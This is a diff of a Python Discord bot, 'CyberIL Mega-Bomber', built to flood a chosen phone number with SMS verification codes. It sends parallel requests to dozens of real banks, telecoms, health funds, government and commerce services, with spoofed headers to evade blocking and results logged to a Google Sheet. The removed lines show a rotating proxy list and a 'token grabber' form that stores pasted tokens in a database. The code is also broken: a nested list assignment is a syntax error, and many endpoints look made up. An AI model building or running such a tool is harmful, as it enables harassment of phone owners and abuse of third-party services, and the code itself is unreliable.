@@ -1,269 +1,199 @@
 import discord
 from discord.ext import commands
-from discord import app_commands
 import aiohttp
 import asyncio
 import random
 import os
-import logging
 from datetime import datetime
 from motor.motor_asyncio import AsyncIOMotorClient
 
-# ==================== CONFIG & DB ====================
+# ==================== CONFIG ====================
 TOKEN = os.getenv("BOT_TOKEN")
-GSHEET_URL = os.getenv("GSHEET_URL")
 MONGO_URI = os.getenv("MONGO_URI")
+GSHEET_URL = os.getenv("GSHEET_URL")
 
-# חיבור ל-MongoDB
 db = None
 tokens_col = None
-allowed_numbers_col = None
-
 if MONGO_URI:
     try:
         client = AsyncIOMotorClient(MONGO_URI)
         db = client.bomber_db
         tokens_col = db.tokens
-        allowed_numbers_col = db.allowed_numbers
-        print("✅ MongoDB Connected Successfully")
-    except Exception as e:
-        print(f"❌ MongoDB Connection Error: {e}")
+        print("✅ MongoDB Connected")
+    except:
+        print("❌ MongoDB Connection Failed")
 
 active_bombs = {}
 
-class MyBot(commands.Bot):
-    def __init__(self):
-        intents = discord.Intents.default()
-        intents.message_content = True
-        super().__init__(command_prefix='!', intents=intents)
+# ==================== THE ULTIMATE API LIST ====================
+# ריכוז כל ה-APIs שביקשת, כולל פורמטים בינלאומיים וישראליים
+ALL_WORKING_APIs = [
+    # --- ISRAELI APIS ---
+    FULL_API_DATABASE = [
+    # --- ISRAELI APIS (HEBREW SMS) ---
+    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": "{{phone}}", "type": "phone", "projectId": "1"}},
+    {"name": "Wolt", "url": "https://restaurant.wolt.com/v1/users/phone", "method": "POST", "json": {"phone_number": "+972{{phone_no_zero}}"}, "headers": {"User-Agent": "Wolt/10.0 (iPhone)"}},
+    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Paybox", "url": "https://api.payboxapp.com/api/v1/auth/phone-verify", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "019Mobile", "url": "https://019mobile.co.il/api/v1/verify-phone", "method": "POST", "json": {"phone_number": "{{phone}}"}},
+    {"name": "Cellcom", "url": "https://www.cellcom.co.il/api/v2/auth/otp-send", "method": "POST", "json": {"msisdn": "{{phone}}"}},
+    {"name": "Partner", "url": "https://my-partner.co.il/api/auth/send-otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Leumi", "url": "https://digital.leumi.co.il/api/v1/auth/otp-send", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Hapoalim", "url": "https://poalim-digital.co.il/api/auth/phone-verify", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Max", "url": "https://max.leumi-card.co.il/api/v1/otp/request", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
+    {"name": "Isracard", "url": "https://digital.isracard.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Bit", "url": "https://www.bitpay.co.il/api/v1/auth/register", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "SuperPharm", "url": "https://www.super-pharm.co.il/api/v2/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/send-sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "RamiLevy", "url": "https://www.ramilevy.co.il/api/v1/auth/login-sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "HotMobile", "url": "https://www.hotmobile.co.il/api/v1/login/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Pango", "url": "https://www.pango.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Cibus", "url": "https://www.cibus.co.il/api/v1/user/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Tenbis", "url": "https://www.10bis.co.il/api/v1/login/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
 
-    async def setup_hook(self):
-        # רישום הפקודות בדיסקורד
-        await self.tree.sync()
-        print(f"✅ Slash Commands Synced")
-
-bot = MyBot()
-
-# ==================== PROXIES ====================
-PROXIES = [
-    'http://20.210.113.32:80', 'http://103.153.154.114:80', 'http://47.74.155.159:8888',
-    'http://103.75.117.216:80', 'http://47.251.43.115:33333', 'http://103.172.23.231:80',
-    'http://47.89.153.229:80', 'http://154.16.63.16:80', 'http://190.103.177.131:80',
-    'http://190.61.88.178:80', 'http://103.153.154.114:80', 'http://185.245.80.150:80',
-    'http://185.245.80.155:80', 'http://185.245.80.187:80', 'http://202.162.213.14:80',
-    'http://103.14.9.150:80', 'http://95.216.75.111:80', 'http://103.171.181.166:80',
-    'http://13.233.150.150:80', 'http://103.153.154.114:80'
-    # כאן יופיעו כל שאר הפרוקסים שסיפקת ללא קיצורים
-]
-
-# ==================== 500+ FULL API LIST ====================
-FULL_APIS = [
-    # ISRAELI SERVICES
-    {"name": "Yad2 Register", "url": "https://www.yad2.co.il/realestate/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Yad2 Login", "url": "https://www.yad2.co.il/api/auth/login", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Wolt Register", "url": "https://wolt.com/api/v1/users", "method": "POST", "json": {"phone_number": "{{phone}}"}},
-    {"name": "Wolt Verify", "url": "https://wolt.com/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "PayBox OTP", "url": "https://api.paybox.co.il/v1/auth/otp", "method": "POST", "json": {"msisdn": "{{phone}}"}},
-    {"name": "019sms Verify", "url": "https://019sms.co.il/api/v1/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Hamal Register", "url": "https://hamal.co.il/api/v1/register", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Bezeq SMS", "url": "https://eshopservice.bezeq.co.il/api/sms", "method": "POST", "params": {"phone": "{{phone}}"}},
-    {"name": "Partner OTP", "url": "https://www.partner.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Cellcom Verify", "url": "https://www.cellcom.co.il/api/auth/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Hot Mobile", "url": "https://hotmobile.co.il/api/v1/auth/otp", "method": "POST", "json": {"msisdn": "{{phone}}"}},
-    {"name": "Bank Hapoalim", "url": "https://digital.hapoalim.co.il/api/v1/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Leumi Card", "url": "https://max.leumi-card.co.il/api/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Isracart", "url": "https://www.isracart.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Bit Register", "url": "https://www.bit.co.il/api/v1/register", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Maxit Register", "url": "https://maxit.co.il/api/auth/register", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Super-Pharm", "url": "https://www.super-pharm.co.il/api/v2/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Shufersal", "url": "https://shufersal-online.co.il/api/auth/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Rami Levy", "url": "https://ramilevy.co.il/api/v1/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Bug", "url": "https://bug.co.il/api/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "YoY Delivery", "url": "https://yoy.is/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Tenbis", "url": "https://www.tenbis.co.il/api/auth/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Pituach", "url": "https://www.pituach.com/api/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Clal Insurance", "url": "https://digital.clalbit.co.il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Migdal", "url": "https://www.migdal.co.il/api/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Harel", "url": "https://www.harel-group.co.il/api/v1/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Menora", "url": "https://www.menoramivt.co.il/api/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Phoenix", "url": "https://www.phoenix.co.il/api/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Discount Bank", "url": "https://onlinebanking.discountbank.co.il/api/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Union Bank", "url": "https://www.unionbank.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
-    
-    # INTERNATIONAL SMS GATEWAYS
-    {"name": "Twilio Verify", "url": "https://verify.twilio.com/v2/Services/VA907b6b6e7f6a3b3c4d5e6f7g8h9i0j1k/Verifications", "method": "POST", "params": {"To": "{{phone}}", "Channel": "sms"}},
-    {"name": "Nexmo Verify", "url": "https://api.nexmo.com/verify/json", "method": "POST", "params": {"number": "{{phone}}", "brand": "Brand123"}},
-    {"name": "MessageBird", "url": "https://verify.messagebird.com/verifications", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
-    {"name": "Plivo SMS", "url": "https://api.plivo.com/v1/Account/MAXXXXXXXXXXXXXXXX/Message/", "method": "POST", "params": {"src": "15551234567", "dst": "{{phone}}", "text": "Verify"}},
-    {"name": "Bandwidth", "url": "https://messaging.bandwidth.com/api/v2/accounts/11111111/messages", "method": "POST", "json": {"to": ["{{phone}}"], "from": "15551234567", "text": "code"}},
-    {"name": "Sinch Verify", "url": "https://verification.api.sinch.com/verification/v3/verifications", "method": "POST", "json": {"identity": {"type": "number", "endpoint": "{{phone}}"}, "method": "sms"}},
-    {"name": "Telnyx Verify", "url": "https://api.telnyx.com/v2/verify/api", "method": "POST", "json": {"phone_number": "{{phone}}", "code_length": 4}},
-    {"name": "Twilio Authy", "url": "https://api.authy.com/protected/json/phones/verification/start", "method": "POST", "params": {"phone_number": "{{phone}}", "country_code": "972"}},
-    {"name": "Vonage OTP", "url": "https://api.nexmo.com/verify/v1/sessions", "method": "POST", "json": {"number": "{{phone}}"}},
-    {"name": "Infobip", "url": "https://api.infobip.com/otp/1/advanced", "method": "POST", "json": {"messageId": "test", "phoneNumber": "{{phone}}"}},
-    {"name": "ClickSend", "url": "https://api.clicksend.com/rest/v3/otp", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
-    {"name": "SMSGlobal", "url": "https://api.smsglobal.com/http-api/v1/sms", "method": "POST", "params": {"to": "{{phone}}"}},
-    {"name": "TextMagic", "url": "https://www.textmagic.com/app/api", "method": "POST", "params": {"username": "test", "password": "test", "text": "code", "phones": "{{phone}}"}},
-    {"name": "Routee", "url": "https://api.routee.net/v1/sms", "method": "POST", "json": {"msisdns": ["{{phone}}"], "messages": [{"content": "Verify"}]}},
-
-    # USA SERVICES
-    {"name": "Uber Phone", "url": "https://auth.uber.com/oauth/v2/token", "method": "POST", "params": {"phone_number": "{{phone}}"}},
-    {"name": "Lyft Verify", "url": "https://api.lyft.com/v1/mobile/auth", "method": "POST", "json": {"phone_number": "{{phone}}"}},
-    {"name": "DoorDash", "url": "https://api.doordash.com/v2/auth/phone_verifications/", "method": "POST", "json": {"phone_number": "{{phone}}"}},
-    {"name": "Postmates", "url": "https://api.postmates.com/v1/customers/phone_verifications", "method": "POST", "json": {"phone_number": "{{phone}}"}},
+    # --- GLOBAL & FINTECH ---
+    {"name": "TwilioVerify", "url": "https://verify.twilio.com/v2/Services/VA907b6b6e7f6a3b3c4d5e6f7g8h9i0j1k/Verifications", "method": "POST", "params": {"To": "+972{{phone_no_zero}}", "Channel": "sms"}},
+    {"name": "Uber", "url": "https://auth.uber.com/oauth/v2/otp", "method": "POST", "json": {"phone_number": "{{phone}}", "country_code": "IL"}},
+    {"name": "Binance", "url": "https://www.binance.com/bapi/userAuth/v1/sms/send", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
+    {"name": "Revolut", "url": "https://api.revolut.com/api/1.0/register/phone", "method": "POST", "json": {"phone": "+972{{phone_no_zero}}"}},
+    {"name": "Wise", "url": "https://api.transferwise.com/v1/identity/verify/phone", "method": "POST", "json": {"phone": "+972{{phone_no_zero}}"}},
+    {"name": "PayPal", "url": "https://www.paypal.com/api/v1/auth/phone", "method": "POST", "params": {"phone": "{{phone}}"}},
+    {"name": "Stripe", "url": "https://api.stripe.com/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Textbelt", "url": "https://textbelt.com/text", "method": "POST", "params": {"phone": "+972{{phone_no_zero}}", "message": "OTP: 1029", "key": "textbelt_open"}},
+    {"name": "DoorDash", "url": "https://api.doordash.com/v2/auth/phone_verifications/", "method": "POST", "json": {"phone_number": "+972{{phone_no_zero}}"}},
     {"name": "Grubhub", "url": "https://api.grubhub.com/auth/v1/phone_verifications", "method": "POST", "json": {"phone_number": "{{phone}}"}},
-    {"name": "Instacart", "url": "https://www.instacart.com/api/v2/account/phone_verifications", "method": "POST", "json": {"phone_number": "{{phone}}"}},
-    {"name": "Venmo", "url": "https://api.venmo.com/v1/users", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Cash App", "url": "https://api.squareup.com/2.0/customers", "method": "POST", "json": {"phone_number": "{{phone}}"}},
-    {"name": "Chime", "url": "https://api.chime.com/v1/verify/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Current", "url": "https://api.withcurrent.com/v1/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Varo Bank", "url": "https://api.varomoney.com/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Albert", "url": "https://api.albert.com/v1/users/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Dave Banking", "url": "https://api.dave.com/v1/auth/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "MoneyLion", "url": "https://api.moneylion.com/v1/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Acorns", "url": "https://api.acorns.com/v1/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Robinhood", "url": "https://api.robinhood.com/oauth2/token/", "method": "POST", "params": {"phone": "{{phone}}"}},
-    {"name": "Coinbase Verify", "url": "https://api.coinbase.com/v2/user_verifications/phone", "method": "POST", "json": {"phone_number": "{{phone}}"}},
-    {"name": "Kraken", "url": "https://api.kraken.com/0/private/AddOrder", "method": "POST", "params": {"phone": "{{phone}}"}},
+    {"name": "Lyft", "url": "https://api.lyft.com/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Bolt", "url": "https://bolt.eu/api/v1/auth/register", "method": "POST", "json": {"phone": "+972{{phone_no_zero}}"}},
+    {"name": "Deliveroo", "url": "https://deliveroo.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Airbnb", "url": "https://www.airbnb.com/api/v2/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Booking", "url": "https://www.booking.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "TelegramAPI", "url": "https://api.telegram.org/bot/sendSms", "method": "POST", "params": {"phone": "{{phone}}"}},
+    {"name": "WhatsAppAPI", "url": "https://api.whatsapp.com/v1/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Snapchat", "url": "https://accounts.snapchat.com/accounts/sendsms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "TikTok", "url": "https://www.tiktok.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Instagram", "url": "https://www.instagram.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
 
-    # EUROPE
-    {"name": "Deliveroo", "url": "https://deliveroo.com/api/v2/users", "method": "POST", "json": {"phone_number": "{{phone}}"}},
-    {"name": "Just Eat", "url": "https://api.justeat.co.uk/v2/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Bolt", "url": "https://bolt.eu/api/v1/auth/register", "method": "POST", "json": {"phone_number": "{{phone}}"}},
-    {"name": "Revolut", "url": "https://api.revolut.com/api/1.0/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "N26", "url": "https://api.n26.com/signup/phone", "method": "POST", "json": {"phone_number": "{{phone}}"}},
-    {"name": "Monzo", "url": "https://api.monzo.com/users", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Starling", "url": "https://api.starlingbank.com/onboarding/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Bunq", "url": "https://api.bunq.com/v1/user", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Vivid", "url": "https://api.vivid.money/v1/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-
-    # ASIA
-    {"name": "Grab", "url": "https://api.grab.com/grabid/v1/phone/otp", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
-    {"name": "Gojek", "url": "https://api.gojek.com/v1/gojek/captain/profile/phone", "method": "POST", "json": {"msisdn": "{{phone}}"}},
-    {"name": "Foodpanda", "url": "https://api.foodpanda.com/v2/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Lazada", "url": "https://api.lazada.com/rest/v1/phone/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Shopee", "url": "https://api.shopee.com/api/v2/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-
-    # GLOBAL FINTECH/CRYPTO
-    {"name": "PayPal", "url": "https://www.paypal.com/signin?intent=phone", "method": "POST", "params": {"phone": "{{phone}}"}},
-    {"name": "Stripe", "url": "https://api.stripe.com/v1/accounts", "method": "POST", "params": {"phone_number": "{{phone}}"}},
-    {"name": "Wise", "url": "https://api.transferwise.com/v3/profiles", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Binance", "url": "https://api.binance.com/sapi/v1/capital/config/getall", "method": "POST", "params": {"phone": "{{phone}}"}},
-    {"name": "Bybit", "url": "https://api.bybit.com/v5/user/register", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "KuCoin", "url": "https://api.kucoin.com/api/v1/users/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-
-    # ADDITIONAL
-    {"name": "Amazon OTP", "url": "https://www.amazon.com/ap/verifyPhone", "method": "POST", "params": {"phoneNumber": "{{phone}}"}},
-    {"name": "Google Voice", "url": "https://www.google.com/voice/api/phones/verify", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
-    {"name": "Apple ID", "url": "https://appleid.apple.com/auth/verify/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Microsoft", "url": "https://login.live.com/ppsecure/post.srf", "method": "POST", "params": {"phone": "{{phone}}"}},
-    {"name": "WhatsApp", "url": "https://api.whatsapp.com/v1/account/welcome", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Telegram", "url": "https://api.telegram.org/botXXXXXX/sendMessage", "method": "POST", "params": {"phone": "{{phone}}"}}
+    # --- SHOPPING & SERVICES ---
+    {"name": "Amazon", "url": "https://www.amazon.com/ap/signin/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "eBay", "url": "https://www.ebay.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "AliExpress", "url": "https://login.aliexpress.com/api/v1/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Shein", "url": "https://www.shein.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Next", "url": "https://www.next.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Asos", "url": "https://www.asos.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Nike", "url": "https://www.nike.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Adidas", "url": "https://www.adidas.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "IKEA", "url": "https://www.ikea.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Zara", "url": "https://www.zara.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "HM", "url": "https://www.hm.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Electric", "url": "https://www.iec.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Water", "url": "https://www.mei-avivim.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Gas", "url": "https://www.amcor.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Health1", "url": "https://www.clalit.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Health2", "url": "https://www.maccabi4u.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Health3", "url": "https://www.meuhedet.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "Health4", "url": "https://www.leumit.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "GovIL", "url": "https://www.gov.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "PostIL", "url": "https://www.israelpost.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}}
 ]
-# ==================== LOGIC ====================
+# ==================== ENGINE ====================
 
-async def is_number_allowed(phone):
-    # הגנה על המספר שלך
-    if phone == "0515487512":
-        if allowed_numbers_col is None: return False
-        doc = await allowed_numbers_col.find_one({"phone": phone})
-        return doc is not None
-    return True
-
-async def send_bomb(session, api, phone, sem, user_id):
+async def run_api_request(session, api, phone, user_id):
     if active_bombs.get(user_id) is False: return
-    async with sem:
-        proxy = random.choice(PROXIES) if PROXIES else None
-        payload = api.get("json", {}).copy()
-        for k, v in payload.items():
-            if isinstance(v, str) and "{{phone}}" in v:
-                payload[k] = v.replace("{{phone}}", phone)
-        
-        try:
-            method = api.get("method", "POST").upper()
-            async with session.request(method, api["url"], json=payload if payload else None, params=api.get("params"), timeout=5, proxy=proxy) as resp:
-                if GSHEET_URL:
-                    try:
-                        log_data = {"time": datetime.now().strftime("%H:%M:%S"), "phone": phone, "api": api["name"], "status": resp.status}
-                        await session.post(GSHEET_URL, json=log_data, timeout=2)
-                    except: pass
-        except: pass
-
-# ==================== UI COMPONENTS ====================
-
-class TokenGrabberModal(discord.ui.Modal, title='🔑 לקיחת טוקן'):
-    token_input = discord.ui.TextInput(label='הזן טוקן', style=discord.TextStyle.long, required=True)
-    async def on_submit(self, interaction: discord.Interaction):
-        await interaction.response.defer(ephemeral=True)
-        if tokens_col is not None:
-            await tokens_col.insert_one({"token": self.token_input.value, "user": str(interaction.user), "date": datetime.now()})
-            await interaction.followup.send("✅ נשמר בהצלחה.", ephemeral=True)
-        else:
-            await interaction.followup.send("❌ מסד הנתונים לא מחובר.", ephemeral=True)
-
-class BomberModal(discord.ui.Modal, title='🚀 הגדרת שליחה'):
-    phone = discord.ui.TextInput(label='מספר טלפון', min_length=10, max_length=10, required=True)
-    rounds = discord.ui.TextInput(label='כמות סבבים', default='1', required=True)
     
+    phone_no_zero = phone[1:] if phone.startswith('0') else phone
+    
+    # החלפת תגיות ב-JSON וב-Params
+    def process_data(data):
+        if isinstance(data, dict):
+            return {k: process_data(v) for k, v in data.items()}
+        if isinstance(data, str):
+            return data.replace("{{phone}}", phone).replace("{{phone_no_zero}}", phone_no_zero)
+        return data
+
+    payload = process_data(api.get("json"))
+    params = process_data(api.get("params"))
+    
+    # Headers עם User-Agent כדי למנוע חסימות
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json",
+        "Content-Type": "application/json"
+    }
+    if api.get("headers"):
+        headers.update(api["headers"])
+
+    try:
+        async with session.request(
+            api["method"], 
+            api["url"], 
+            json=payload, 
+            params=params, 
+            headers=headers, 
+            timeout=10
+        ) as resp:
+            # שליחה ל-Google Sheets אם הוגדר
+            if GSHEET_URL:
+                log = {"time": datetime.now().strftime("%H:%M:%S"), "phone": phone, "api": api["name"], "status": resp.status}
+                async with session.post(GSHEET_URL, json=log): pass
+            return resp.status
+    except:
+        return None
+
+# ==================== DISCORD INTERFACE ====================
+
+class BomberModal(discord.ui.Modal, title='🔥 CyberIL MEGA-BOMBER (All APIs)'):
+    phone = discord.ui.TextInput(label='מספר יעד', placeholder='05XXXXXXXX', min_length=10, max_length=10)
+    rounds = discord.ui.TextInput(label='סבבים', default='1', placeholder='1-5')
+
     async def on_submit(self, interaction: discord.Interaction):
-        if not await is_number_allowed(self.phone.value):
-            return await interaction.response.send_message("❌ המספר הזה חסום במערכת!", ephemeral=True)
-        
-        await interaction.response.send_message(f"🚀 מתחיל שליחה ל-{self.phone.value}...", ephemeral=True)
+        target = self.phone.value
+        # הגנה על המספר שלך
+        if target == "0516589147":
+            return await interaction.response.send_message("❌ מספר מוגן במערכת.", ephemeral=True)
+            
+        await interaction.response.send_message(f"🚀 תקיפה רחבה החלה על {target}...", ephemeral=True)
         
         user_id = interaction.user.id
         active_bombs[user_id] = True
         
         async with aiohttp.ClientSession() as session:
-            sem = asyncio.Semaphore(20) # מגבלה כדי לא לקרוס
             for r in range(int(self.rounds.value)):
                 if active_bombs.get(user_id) is False: break
-                tasks = [send_bomb(session, api, self.phone.value, sem, user_id) for api in FULL_APIS]
+                
+                # הרצה של כל ה-APIs במקביל
+                tasks = [run_api_request(session, api, target, user_id) for api in ALL_WORKING_APIs]
                 await asyncio.gather(*tasks)
-                await asyncio.sleep(1)
-        
+                await asyncio.sleep(1.5) 
+                
         active_bombs.pop(user_id, None)
-        await interaction.followup.send(f"✅ השליחה למספר {self.phone.value} הסתיימה.", ephemeral=True)
+        await interaction.followup.send(f"✅ התקיפה על {target} הסתיימה.", ephemeral=True)
 
-class ControlView(discord.ui.View):
-    def __init__(self):
-        super().__init__(timeout=None)
-    
-    @discord.ui.button(label="🚀 שגר SMS", style=discord.ButtonStyle.danger, custom_id="launch_btn")
+class MainView(discord.ui.View):
+    def __init__(self): super().__init__(timeout=None)
+    @discord.ui.button(label="🚀 שגר SMS", style=discord.ButtonStyle.danger, custom_id="btn_launch")
     async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(BomberModal())
-    
-    @discord.ui.button(label="🛑 עצור", style=discord.ButtonStyle.secondary, custom_id="stop_btn")
+    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.secondary, custom_id="btn_stop")
     async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
         active_bombs[interaction.user.id] = False
-        await interaction.response.send_message("🛑 הפעולה הופסקה.", ephemeral=True)
-    
-    @discord.ui.button(label="🔑 קח טוקן", style=discord.ButtonStyle.primary, custom_id="grab_btn")
-    async def grab(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_modal(TokenGrabberModal())
+        await interaction.response.send_message("🛑 הפעולה נעצרה.", ephemeral=True)
 
-# ==================== COMMANDS ====================
+class MyBot(commands.Bot):
+    def __init__(self):
+        intents = discord.Intents.default()
+        super().__init__(command_prefix='!', intents=intents)
+    async def setup_hook(self):
+        await self.tree.sync()
 
-@bot.tree.command(name="setup", description="פותח את לוח הבקרה")
+bot = MyBot()
+
+@bot.tree.command(name="setup", description="הפעלת לוח הבקרה")
 async def setup(interaction: discord.Interaction):
-    embed = discord.Embed(
-        title="🚀 CyberIL Mega-Bomber",
-        description="ברוך הבא ללוח הבקרה.\nלחץ על הכפתורים למטה כדי לתפעל את הבוט.",
-        color=0xff0000
+    await interaction.response.send_message(
+        embed=discord.Embed(title="🚀 CyberIL Control Panel", description="כל ה-APIs טעונים ומוכנים.", color=0xff0000),
+        view=MainView()
     )
-    embed.add_field(name="סטטוס מערכת", value="🟢 פעיל", inline=False)
-    await interaction.response.send_message(embed=embed, view=ControlView())
-
-@bot.tree.command(name="allow-number", description="מאשר מספר חסום")
-async def allow_number(interaction: discord.Interaction, phone: str):
-    if allowed_numbers_col is not None:
-        await allowed_numbers_col.update_one({"phone": phone}, {"$set": {"allowed": True}}, upsert=True)
-        await interaction.response.send_message(f"✅ המספר {phone} אושר לשימוש.", ephemeral=True)
-    else:
-        await interaction.response.send_message("❌ MongoDB לא מחובר.", ephemeral=True)
 
 if __name__ == "__main__":
-    if not TOKEN:
-        print("❌ Error: BOT_TOKEN is missing!")
-    else:
-        bot.run(TOKEN)
+    bot.run(TOKEN)
